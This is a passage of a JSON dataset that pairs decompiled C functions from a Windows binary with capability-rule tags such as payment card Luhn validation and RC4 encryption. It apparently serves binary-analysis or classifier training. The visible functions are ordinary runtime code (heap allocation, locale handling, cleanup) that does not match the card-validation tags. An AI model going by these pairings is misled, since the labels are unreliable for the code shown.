        "decompiled_code": "\nuint64_t fcn.14000c4a8(int64_t arg1, uint64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    \n    if (arg2 < 0x8000000000000000) {\n        arg2 = arg2 * 2;\n        if (((*(arg1 + 0x408) == 0) && (arg2 < 0x401)) || (arg2 < *(arg1 + 0x400) || arg2 == *(arg1 + 0x400))) {\n            uVar2 = 0x7fffffffffffff01;\n        }\n        else {\n            iVar1 = fcn.14001a93c(arg2);\n            if (iVar1 != 0) {\n                fcn.140019b4c(*(arg1 + 0x408));\n                *(arg1 + 0x408) = iVar1;\n                *(arg1 + 0x400) = arg2;\n            }\n            uVar2 = fcn.140019b4c(0);\n            uVar2 = uVar2 & 0xffffffffffffff00 | iVar1 != 0;\n        }\n    }\n    else {\n        *(arg3 + 0x30) = 1;\n        uVar2 = 0x7fffffffffffff00;\n        *(arg3 + 0x2c) = 0xc;\n    }\n    return uVar2;\n}\n",
        "token_count": 318
    },
    "14000c55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14000c550(int64_t arg1, uint64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    \n    if (arg2 < 0x4000000000000000) {\n        arg2 = arg2 * 4;\n        if (((*(arg1 + 0x408) == 0) && (arg2 < 0x401)) || (arg2 < *(arg1 + 0x400) || arg2 - *(arg1 + 0x400) == 0)) {\n            uVar2 = 0x3fffffffffffff01;\n        }\n        else {\n            iVar1 = fcn.14001a93c(arg2);\n            if (iVar1 != 0) {\n                fcn.140019b4c(*(arg1 + 0x408));\n                *(arg1 + 0x408) = iVar1;\n                *(arg1 + 0x400) = arg2;\n            }\n            uVar2 = fcn.140019b4c(0);\n            uVar2 = uVar2 & 0xffffffffffffff00 | iVar1 != 0;\n        }\n    }\n    else {\n        *(arg3 + 0x30) = 1;\n        uVar2 = 0x3fffffffffffff00;\n        *(arg3 + 0x2c) = 0xc;\n    }\n    return uVar2;\n}\n",
        "token_count": 320
    },
    "14000fe2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nulong fcn.14000fe28(ulong *arg1)\n\n{\n    ushort uVar1;\n    int64_t arg1_00;\n    int32_t iVar2;\n    ulong *puVar3;\n    uchar uStackX8;\n    char cStackX9;\n    \n    *(arg1 + 0x4c) = 1;\n    arg1[3] = arg1[3] + 8;\n    uVar1 = *(arg1[3] + -8);\n    cStackX9 = fcn.14000c5fc(*arg1, *(arg1 + 0x3a), *(arg1 + 0x34));\n    if (cStackX9 == '\\0') {\n        uStackX8 = uVar1;\n        arg1_00 = arg1[1];\n        if (*(arg1_00 + 0x28) == '\\0') {\n            fcn.140010150(arg1_00);\n        }\n        puVar3 = arg1[0x8b];\n        if (arg1[0x8b] == NULL) {\n            puVar3 = arg1 + 10;\n        }\n        iVar2 = fcn.14001ba3c(puVar3, &uStackX8, *(*(arg1_00 + 0x18) + 8), arg1_00);\n        if (iVar2 < 0) {\n            *(arg1 + 7) = 1;\n        }\n    }\n    else {\n        puVar3 = arg1[0x8b];\n        if (arg1[0x8b] == NULL) {\n            puVar3 = arg1 + 10;\n        }\n        *puVar3 = uVar1;\n    }\n    *(arg1 + 9) = 1;\n    puVar3 = arg1[0x8b];\n    if (arg1[0x8b] == NULL) {\n        puVar3 = arg1 + 10;\n    }\n    arg1[8] = puVar3;\n    return 1;\n}\n",
        "token_count": 445
    },
    "14001015": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140010150(int64_t arg1)\n\n{\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.14000bc38(arg1);\n    *(arg1 + 0x18) = *(arg1_00 + 0x90);\n    *(arg1 + 0x20) = *(arg1_00 + 0x88);\n    fcn.14001a9d0(arg1_00, arg1 + 0x18);\n    fcn.14001aa3c(arg1_00, arg1 + 0x20);\n    if ((*(arg1_00 + 0x3a8) & 2) == 0) {\n        *(arg1_00 + 0x3a8) = *(arg1_00 + 0x3a8) | 2;\n        *(arg1 + 0x28) = 2;\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "140010a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.140010a20(ulong noname_0, ulong *arg2, ulong *arg3, ulong *arg4)\n\n{\n    uint uVar1;\n    \n    fcn.14000c298(*arg2);\n    uVar1 = fcn.140010b4c(**arg3);\n    fcn.14000c2a4(*arg4);\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "14001168": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140011684(ulong noname_0, ulong *arg2, ulong arg3, ulong *arg4)\n\n{\n    ulong uVar1;\n    \n    fcn.14000c298(*arg2);\n    uVar1 = fcn.1400116c4(arg3);\n    fcn.14000c2a4(*arg4);\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "14001174": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140011744(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4, int64_t arg_30h)\n\n{\n    ulong uVar1;\n    ulong var_10h;\n    int64_t var_18h_2;\n    int64_t var_20h_2;\n    int64_t var_28h;\n    ulong var_40h;\n    int64_t var_38h;\n    int64_t var_30h;\n    ulong *var_28h_2;\n    int64_t var_20h;\n    ulong *var_18h;\n    ulong *var_10h_2;\n    ulong *var_8h;\n    \n    if ((arg2 != 0) && (arg3 != 0)) {\n        var_10h = arg1;\n        var_18h_2 = arg2;\n        var_20h_2 = arg3;\n        var_28h = arg4;\n        if (arg4 != 0) {\n            var_28h_2 = &var_28h;\n            var_20h = arg_30h;\n            var_18h = &var_10h;\n            var_10h_2 = &var_18h_2;\n            var_8h = &var_20h_2;\n            var_38h = arg4;\n            var_30h = arg4;\n            uVar1 = fcn.140011684(&var_40h, &var_30h, &var_28h_2, &var_38h);\n            return uVar1;\n        }\n        *(arg_30h + 0x30) = 1;\n        *(arg_30h + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    return 0;\n}\n",
        "token_count": 416
    },
    "140011a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.140011a84(ulong noname_0, ulong *arg2, ulong arg3, ulong *arg4)\n\n{\n    uint uVar1;\n    \n    fcn.14000c298(*arg2);\n    uVar1 = fcn.140011ac4(arg3);\n    fcn.14000c2a4(*arg4);\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "140011ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140011ac4(uint64_t **arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    uint uVar4;\n    \n    uVar1 = **arg1;\n    fcn.140010ac0(*arg1[1], arg1[2]);\n    fcn.14001a688(*arg1[1]);\n    LOCK();\n    *(*arg1[1] + 0x14) = *(*arg1[1] + 0x14) & 0xfffff81f;\n    if ((*arg1[3] & 4) == 0) {\n        uVar3 = *arg1[4];\n        uVar4 = uVar1 & 0xfffffffffffffffe;\n        if (uVar3 == 0) {\n            uVar1 = fcn.140019ad4(uVar1 & 0xfffffffffffffffe, 1);\n            fcn.140019b4c(0);\n            if (uVar1 == 0) {\n                *0x14003fe08 = *0x14003fe08 + 1;\n                return 0xffffffff;\n            }\n            puVar2 = *arg1[1];\n            LOCK();\n            *(puVar2 + 0x14) = *(puVar2 + 0x14) | 0x140;\n            *(puVar2 + 4) = uVar4;\n            *puVar2 = uVar1;\n            puVar2[1] = uVar1;\n            goto code_r0x000140011b95;\n        }\n        puVar2 = *arg1[1];\n        LOCK();\n        *(puVar2 + 0x14) = *(puVar2 + 0x14) | 0x180;\n        *(puVar2 + 4) = uVar4;\n    }\n    else {\n        puVar2 = *arg1[1];\n        uVar3 = puVar2 + 0x1c;\n        LOCK();\n        *(puVar2 + 0x14) = *(puVar2 + 0x14) | 0x400;\n        *(puVar2 + 4) = 2;\n    }\n    *puVar2 = uVar3;\n    puVar2[1] = uVar3;\ncode_r0x000140011b95:\n    *(puVar2 + 2) = 0;\n    return 0;\n}\n",
        "token_count": 534
    },
    "140011ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140011ec0(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x140040040;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x14003fe10);\n        *0x140040040 = *0x140040040 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 111
    },
    "14001a93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14001a93c(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        if (arg1 == 0) {\n            arg1 = 1;\n        }\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x140040928, 0, arg1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.1400184b4();\n        } while ((iVar1 != 0) && (iVar1 = fcn.140015da8(arg1),  iVar1 != 0));\n    }\n    puVar3 = fcn.140012c78();\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 198
    },
    "140012be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140012bec(uint64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    uint64_t arg1_00;\n    ulong in_RDX;\n    \n    arg1_00 = arg1 & 0xffffffff;\n    iVar2 = fcn.1400198ec(arg1, in_RDX);\n    if (iVar2 == 0) {\n        puVar3 = 0x14003e180;\n    }\n    else {\n        puVar3 = iVar2 + 0x24;\n    }\n    *puVar3 = arg1_00;\n    uVar1 = fcn.140012ba4(arg1_00);\n    iVar2 = fcn.1400198ec(arg1_00, in_RDX);\n    puVar3 = 0x14003e17c;\n    if (iVar2 != 0) {\n        puVar3 = iVar2 + 0x20;\n    }\n    *puVar3 = uVar1;\n    return;\n}\n",
        "token_count": 226
    },
    "140012c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140012c34(ulong arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    \n    *(arg2 + 0x38) = 1;\n    *(arg2 + 0x34) = arg1;\n    uVar1 = fcn.140012ba4(arg1);\n    *(arg2 + 0x2c) = uVar1;\n    *(arg2 + 0x30) = 1;\n    return;\n}\n",
        "token_count": 105
    },
    "140015da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140015da8(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140015de4();\n    if ((iVar2 != 0) && (iVar1 = (**0x14002b348)(arg1),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 88
    },
    "1400163d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400163dc(void)\n\n{\n    int64_t iVar1;\n    int64_t arg1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*0x140040178 == 0) {\n        fcn.14002187c();\n        arg1 = fcn.140021c40();\n        if (arg1 == 0) {\n            fcn.140019b4c(0);\n            uVar2 = 0xffffffff;\n        }\n        else {\n            iVar3 = fcn.140016450(arg1);\n            iVar1 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0xffffffff;\n                iVar3 = *0x140040178;\n                iVar1 = *0x140040190;\n            }\n            *0x140040190 = iVar1;\n            *0x140040178 = iVar3;\n            fcn.140019b4c(0);\n            fcn.140019b4c(arg1);\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "1400165a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400165a4(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    \n    piVar3 = *0x140040180;\n    if (*0x140040180 == NULL) {\ncode_r0x0001400165cd:\n        iVar2 = 0xffffffff;\n    }\n    else {\n        for (; iVar2 = *piVar3,  iVar2 != 0; piVar3 = piVar3 + 1) {\n            iVar1 = fcn.14002026c(0, 0, iVar2, 0xffffffff);\n            if (iVar1 == 0) goto code_r0x0001400165cd;\n            iVar2 = fcn.140019ad4(iVar1, 1);\n            if (iVar2 == 0) {\n                iVar2 = 0;\ncode_r0x000140016678:\n                fcn.140019b4c(iVar2);\n                goto code_r0x0001400165cd;\n            }\n            iVar1 = fcn.14002026c(0, 0, *piVar3, 0xffffffff);\n            if (iVar1 == 0) goto code_r0x000140016678;\n            fcn.140022190(iVar2, 0);\n            fcn.140019b4c(0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 312
    },
    "14001668": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016684(int64_t *arg1)\n\n{\n    if (*arg1 != *0x140040190) {\n        fcn.140016560(*arg1);\n    }\n    return;\n}\n",
        "token_count": 47
    },
    "1400166a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400166a0(int64_t *arg1)\n\n{\n    if (*arg1 != *0x140040188) {\n        fcn.140016560(*arg1);\n    }\n    return;\n}\n",
        "token_count": 49
    },
    "14001656": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016560(int64_t *arg1)\n\n{\n    int64_t lpMem;\n    int64_t *piVar1;\n    \n    if (arg1 != NULL) {\n        lpMem = *arg1;\n        piVar1 = arg1;\n        while (lpMem != 0) {\n            fcn.140019b4c(lpMem);\n            piVar1 = piVar1 + 1;\n            lpMem = *piVar1;\n        }\n        fcn.140019b4c(arg1);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "1400166f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400166f8(void)\n\n{\n    int64_t *lpMem;\n    int64_t lpMem_00;\n    int64_t *piVar1;\n    \n    fcn.140016684(0x140040178);\n    fcn.1400166a0(0x140040180);\n    fcn.140016560(*0x140040190);\n    lpMem = *0x140040188;\n    if (*0x140040188 != NULL) {\n        lpMem_00 = **0x140040188;\n        piVar1 = *0x140040188;\n        while (lpMem_00 != 0) {\n            fcn.140019b4c(lpMem_00);\n            piVar1 = piVar1 + 1;\n            lpMem_00 = *piVar1;\n        }\n        fcn.140019b4c(lpMem);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "14001679": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016794(int64_t *arg1, int64_t *arg2)\n\n{\n    if (arg1 != arg2) {\n        do {\n            if (*arg1 != 0) {\n                (**0x14002b348)();\n            }\n            arg1 = arg1 + 1;\n        } while (arg1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "1400167d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400167d8(int64_t *arg1, int64_t *arg2)\n\n{\n    ulong uVar1;\n    bool bVar2;\n    \n    bVar2 = arg1 == arg2;\n    while( true ) {\n        if (bVar2) {\n            return 0;\n        }\n        if ((*arg1 != 0) && (uVar1 = (**0x14002b348)(),  uVar1 != 0)) break;\n        arg1 = arg1 + 1;\n        bVar2 = arg1 == arg2;\n    }\n    return uVar1;\n}\n",
        "token_count": 134
    },
    "14001682": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016820(ulong noname_0, uint32_t *arg2, ulong arg3, uint32_t *arg4)\n\n{\n    fcn.140011ea4(*arg2);\n    fcn.140016858(arg3);\n    fcn.140011ef8(*arg4);\n    return;\n}\n",
        "token_count": 72
    },
    "14001844": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140018448(uint64_t arg1, uint64_t arg2)\n\n{\n    uint16_t uVar1;\n    int64_t iVar2;\n    uint64_t arg1_00;\n    uint64_t uVar3;\n    \n    uVar3 = 0;\n    arg1_00 = arg1;\n    if (arg2 != 0) {\n        do {\n            uVar1 = *(arg1 + uVar3 * 2);\n            iVar2 = fcn.140012270(arg1_00);\n            if ((0xff < uVar1) || (uVar1 = *(iVar2 + uVar1 * 2),  arg1_00 = uVar1 & 0x103,  (uVar1 & 0x103) == 0)) {\n                return 0;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg2);\n    }\n    return 1;\n}\n",
        "token_count": 211
    },
    "14001852": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.14001852c(ulong noname_0, uint32_t *arg2, ulong arg3, uint32_t *arg4)\n\n{\n    uint uVar1;\n    \n    fcn.140011ea4(*arg2);\n    uVar1 = fcn.140018718(arg3);\n    fcn.140011ef8(*arg4);\n    return uVar1;\n}\n",
        "token_count": 87
    },
    "1400188b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1400188b4(ulong arg1, ulong arg2)\n\n{\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong var_20h_2;\n    ulong var_28h;\n    ulong var_20h;\n    ulong *var_18h;\n    ulong *var_bp_10h;\n    \n    var_18h = &uStackX8;\n    var_bp_10h = &uStackX16;\n    var_28h._0_4_ = 2;\n    var_20h._0_4_ = 2;\n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    fcn.1400184f0(&var_20h_2, &var_20h, &var_18h, &var_28h);\n    return;\n}\n",
        "token_count": 195
    },
    "14001884": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140018848(ulong arg1)\n\n{\n    ulong uStackX8;\n    uchar auStackX16 [8];\n    uint auStackX24 [2];\n    uint auStackX32 [2];\n    ulong *puStack24;\n    ulong uStack16;\n    \n    uStack16 = 0xfffffffffffffffe;\n    puStack24 = &uStackX8;\n    auStackX24[0] = 2;\n    auStackX32[0] = 2;\n    uStackX8 = arg1;\n    fcn.14001852c(auStackX16, auStackX32, &puStack24, auStackX24);\n    return;\n}\n",
        "token_count": 150
    },
    "140019df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140019df8(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.140019c38(0x18, \"AppPolicyGetProcessTerminationMethod\", 0x140031bb4, \n                          \"AppPolicyGetProcessTerminationMethod\");\n    if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x000140019e3e. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**0x14002b348)(0xfffffffffffffffa, arg1);\n        return uVar2;\n    }\n    return 0xc0000225;\n}\n",
        "token_count": 158
    },
    "140019e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140019e50(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.140019c38(0, \"AreFileApisANSI\", 0x140031a78, 0x140031a7c);\n    if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x000140019e83. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**0x14002b348)();\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 136
    },
    "14001a0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a0d0(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.140019c38(0xb, \"GetUserDefaultLocaleName\", 0x140031b10, \"GetUserDefaultLocaleName\");\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetUserDefaultLCID)();\n        fcn.14001a210(uVar2, arg1, arg2, 0);\n    }\n    else {\n        (**0x14002b348)(arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "14001a13": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a13c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140019c38(0xe, 0x14002d840, 0x140031b38, 0x140031b40);\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(arg1, arg2);\n    }\n    else {\n        (**0x14002b348)(arg1, arg2, arg3);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "14001a1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a1ac(ulong arg1)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.140019c38(0xf, \"IsValidLocaleName\", 0x140031b40, \"IsValidLocaleName\");\n    if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x00014001a1eb. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x14002b348)(arg1);\n        return;\n    }\n    uVar2 = fcn.14001a380(arg1, 0);\n    // WARNING: Could not recover jumptable at 0x00014001a208. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_IsValidLocale)(uVar2, 1);\n    return;\n}\n",
        "token_count": 203
    },
    "14001a29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a294(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    \n    iVar2 = fcn.140019c38(0x10, 0x140031b68, 0x140031b60, 0x140031b68);\n    if (iVar2 == 0) {\n        uVar1 = fcn.14001a380(arg1, 0);\n        (*_sym.imp.KERNEL32.dll_LCMapStringW)(uVar1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n    }\n    else {\n        (**0x14002b348)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                        in_stack_00000040, in_stack_00000048);\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "14001a38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a380(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    char *arg2_00;\n    \n    arg2_00 = \"LocaleNameToLCID\";\n    iVar1 = fcn.140019c38(0x12, \"LocaleNameToLCID\", 0x140031b98, \"LocaleNameToLCID\");\n    if (iVar1 == 0) {\n        fcn.14002502c(arg1, arg2_00);\n    }\n    else {\n        (**0x14002b348)(arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "14001a99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a99c(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x140040220) && ((*0x14003e520 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.140023868(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "14001a9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a9d0(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t in_R8;\n    \n    if ((*arg2 != *(in_R8 * 8 + 0x140040220)) && ((*0x14003e520 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.140023868(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "14001aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001aa08(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x140040910) && ((*0x14003e520 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.1400218dc(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "14001aa3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001aa3c(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t in_R8;\n    \n    if ((*arg2 != *(in_R8 * 8 + 0x140040910)) && ((*0x14003e520 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.1400218dc(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "14001b88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.14001b88c(int32_t *arg1, uchar *arg2, uint64_t arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint16_t in_R9W;\n    uint64_t uStackX16;\n    uint16_t auStackX32 [4];\n    int64_t in_stack_00000028;\n    \n    if ((arg2 == NULL) && (arg3 != 0)) {\n        if (arg1 == NULL) {\n            return 0;\n        }\n        *arg1 = 0;\n        return 0;\n    }\n    if (arg1 != NULL) {\n        *arg1 = -1;\n    }\n    if (arg3 < 0x80000000) {\n        auStackX32[0] = in_R9W;\n        if (*(in_stack_00000028 + 0x28) == '\\0') {\n            fcn.140010150(in_stack_00000028);\n        }\n        uVar1 = *(*(in_stack_00000028 + 0x18) + 0xc);\n        if (uVar1 == 0xfde9) {\n            uStackX16 = 0;\n            iVar2 = fcn.140026498(arg2, auStackX32[0], &uStackX16, in_stack_00000028);\n            if (arg1 != NULL) {\n                *arg1 = iVar2;\n            }\n            if (iVar2 < 5) {\n                return 0;\n            }\n            if (*(in_stack_00000028 + 0x30) != '\\0') {\n                return *(in_stack_00000028 + 0x2c);\n            }\n            return 0;\n        }\n        if (*(*(in_stack_00000028 + 0x18) + 0x138) == 0) {\n            if (0xff < auStackX32[0]) {\n                if ((arg2 != NULL) && (arg3 != 0)) {\n                    fcn.140008040(arg2, 0, arg3);\n                }\n                goto code_r0x00014001b96e;\n            }\n            if (arg2 == NULL) {\ncode_r0x00014001b99a:\n                if (arg1 != NULL) {\n                    *arg1 = 1;\n                }\n                return 0;\n            }\n            if (arg3 != 0) {\n                *arg2 = auStackX32[0];\n                goto code_r0x00014001b99a;\n            }\n        }\n        else {\n            uStackX16 = uStackX16 & 0xffffffff00000000;\n            iVar2 = fcn.14002026c(uVar1, 0, auStackX32, 1);\n            if (iVar2 != 0) {\n                if (uStackX16 == 0) {\n                    if (arg1 == NULL) {\n                        return 0;\n                    }\n                    *arg1 = iVar2;\n                    return 0;\n                }\ncode_r0x00014001b96e:\n                *(in_stack_00000028 + 0x2c) = 0x2a;\n                *(in_stack_00000028 + 0x30) = 1;\n                return 0x2a;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 != 0x7a) goto code_r0x00014001b96e;\n            if ((arg2 != NULL) && (arg3 != 0)) {\n                